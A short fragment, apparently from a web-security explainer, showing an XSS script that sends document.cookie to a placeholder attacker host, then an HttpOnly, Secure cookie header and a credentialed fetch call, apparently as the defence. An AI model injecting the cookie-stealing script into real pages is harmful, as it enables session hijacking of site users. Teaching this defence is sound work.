```
<script>
 fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```


Set-Cookie: jwt=eyJhbGciOi...; HttpOnly; Secure; SameSite;


```

fetch("/api/user", {
    method: "GET",
    credentials: "include",
});

```

